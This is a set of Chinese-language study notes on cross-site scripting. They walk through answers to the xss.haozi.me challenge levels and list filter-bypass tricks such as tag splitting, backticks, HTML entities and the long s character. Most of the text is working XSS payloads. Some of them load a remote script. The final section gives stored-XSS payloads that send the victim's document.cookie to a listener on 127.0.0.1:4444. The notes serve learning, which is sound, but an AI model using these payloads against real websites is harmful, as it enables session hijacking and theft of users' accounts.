### XSS漏洞跨站攻击

* 全部都是前端的漏洞
* 安全人员平常测试xss漏洞都是弹窗来测试漏洞

```
<script>alert(1)</script>
```

* 在前端的世界里，html、css、js如果被正确执行，就无法在前端被人看到
* xss攻击的目标就是让前端把我们的攻击代码执行

```
// 匹配<script>然后被干掉
<scr<script>ipt>alert(1)</script>

<img src=x onerror = "alert(1)" />
    
<h1 onclick = "alert(1)">click me</h1>
```

```
https://xss.haozi.me

// 0x02，单标签闭合
answer:x"><script>alert(1)</script><img src="x"
    
// 0x03 正则表达式,括号可以用``来代替
'''
function render (input) {
  const stripBracketsRe = /[()]/g	// 匹配()内的内容，将()内的内容提取并且将()替换为空
  input = input.replace(stripBracketsRe, '')
  return input
}
'''
answer:<script>alert`1`</script>

// 0x04 <svg>翻译，先将需要的转码字符unicode转换
answer:<svg><script>alert&#40;1&#41;</script>

// 0x05
注释符：<!-- -->
		<!-- --!>
answer：--!><script>alert(1)</script><!--

// 0x06
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
auto 或 on 开头，后面接任意东西，直到出现 = 或者 >，都转化为_
answer:onmouseover
="alert(1)" // 换行

// 0x07
所有标签类的，只让写左标签，右标签加上去，就会替换为空
answer: <img src=x onerror = "alert(1)"

//0x08
换行也可以执行
</style
>

<style>

//0x09
语句中必须包含https://www.segmentfault.com
https://www.segmentfault.com"></script><img src="x" onerror="alert(1)
```

```
小知识：
可以在别人的src中添加自己的链接，以此alert(1)：
<script type="text/javascript" src="http://127.0.0.1/haha.js"></script>
```

```
//0x0A
https://www.segmentfault.com@http://127.0.0.1/haha.js

//0x0B
把所有的输入内容都大写
js标签、src的地址随便大小写，但是js的语法是大小写敏感的
<script src="http://127.0.0.1/haha.js"></script>

//0x0C
<scriscriptpt src="http://127.0.0.1/haha.js"></scrscriptipt>

//0x0d
过滤掉< " ' /

xx
alert(1)
-->

//0x0e
维基百科查s发现有个长s:ſ,可以替换s(古英语的s)
<ſcript src="http://127.0.0.1/haha.js"></script>

//0x0F
');alert(1) //
```

```
有时也可以执行：
<script/haha>alert(1)</script>
<img src='x' onerror=alert(1)>
<svg onload="alert(1)">
<img/onerror=alert(1) src="x">
```

```
如果某天不能用外网，不能用kali
存储型xss最重要的是获取用户的cookie

<script>var img = document.createElement("img"); 
img.src="http://127.0.0.1:4444/a?"+escape(document.cookie);</script>

<script>document.write('<img src="127.0.0.1:4444/?' + document.cookie+'">');</script>
```


```
小技巧：
<a href=javascript:alert(1)>
合法连接：必须要有http或者https协议才叫合法
```
